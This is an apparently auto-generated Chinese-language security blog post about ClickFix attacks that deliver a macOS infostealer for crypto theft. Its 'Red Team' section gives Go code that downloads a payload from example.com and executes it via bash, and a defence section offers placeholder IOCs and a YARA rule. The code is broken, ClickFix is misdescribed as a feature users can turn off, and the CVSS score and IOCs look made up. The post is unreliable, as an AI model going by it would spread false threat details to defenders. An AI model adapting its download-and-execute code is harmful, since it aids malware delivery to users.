---
layout: post
title:  "ClickFix attack pushes macOS infostealer for crypto theft attacks"
date:   2026-08-06 23:54:00 +0000
categories: [security]
severity: critical
---

# 🚨 解析 ClickFix 攻擊：利用 Go-based Malware 進行 macOS 用戶資訊竊取與加密貨幣盜竊

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Info Leak 和 RCE (Remote Code Execution)
> * **關鍵技術**: `Mach-O Payload`, `osascript`, `Gatekeeper 繞過`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ClickFix 攻擊利用 Bash 腳本下載並執行 Mach-O Payload，該 Payload 可以繞過 Gatekeeper 的安全檢查，進而竊取用戶資訊和加密貨幣。
* **攻擊流程圖解**:
  1. 用戶點擊惡意連結，下載 Bash 腳本。
  2. Bash 腳本執行，下載 Mach-O Payload。
  3. Mach-O Payload 執行，繞過 Gatekeeper 的安全檢查。
  4. Payload竊取用戶資訊和加密貨幣。
* **受影響元件**: macOS 用戶，特別是那些使用 ClickFix 的用戶。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道用戶的電子郵件地址和用戶的 macOS 版本。
* **Payload 建構邏輯**:

    ```
    
    go
    package main
    
    import (
    	"crypto/rand"
    	"crypto/rsa"
    	"crypto/x509"
    	"encoding/pem"
    	"fmt"
    	"io/ioutil"
    	"log"
    	"net/http"
    	"os"
    	"path/filepath"
    )
    
    func main() {
    	// 下載 Mach-O Payload
    	resp, err := http.Get("https://example.com/payload")
    	if err != nil {
    		log.Fatal(err)
    	}
    	defer resp.Body.Close()
    
    	// 執行 Mach-O Payload
    	cmd := exec.Command("bash", "-c", "chmod +x payload && ./payload")
    	cmd.Stdout = os.Stdout
    	cmd.Stderr = os.Stderr
    	if err := cmd.Run(); err != nil {
    		log.Fatal(err)
    	}
    }
    
    ```
* **繞過技術**: 攻擊者可以使用 `osascript` 工具來繞過 Gatekeeper 的安全檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /Users/username/Desktop/payload |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule ClickFix_Malware {
      meta:
        description = "Detects ClickFix malware"
        author = "Your Name"
      strings:
        $a = "https://example.com/payload"
        $b = "bash -c"
      condition:
        all of them
    }
    
    ```
* **緩解措施**: 用戶可以更新 macOS 版本，關閉 ClickFix 功能，並使用防毒軟件進行掃描。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Mach-O Payload**: 一種 macOS 的可執行檔格式，通常用於下載和執行惡意程式。
* **Gatekeeper**: 一種 macOS 的安全功能，負責檢查和驗證下載的應用程式和檔案。
* **osascript**: 一種 macOS 的工具，允許用戶執行 AppleScript 腳本。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/clickfix-attack-pushes-macos-infostealer-for-crypto-theft-attacks/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


